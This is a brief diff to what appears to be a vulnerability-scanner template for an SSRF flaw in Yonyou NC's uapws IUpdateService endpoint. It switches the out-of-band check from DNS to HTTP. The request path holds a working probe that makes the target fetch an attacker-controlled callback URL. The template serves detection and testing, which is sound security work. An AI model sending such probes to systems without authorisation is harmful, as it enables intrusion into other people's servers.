@@ -15,11 +15,11 @@ info:
 
 set:
   oob: oob()
-  oobDNS: oob.DNS
+  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
       method: GET
-      path: /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://{{oobDNS}}
-    expression: oobcheck(oob, "dns", 3)
+      path: /uapws/service/nc.uap.oba.update.IUpdateService?xsd={{oobHTTP}}
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
 expression: r0()
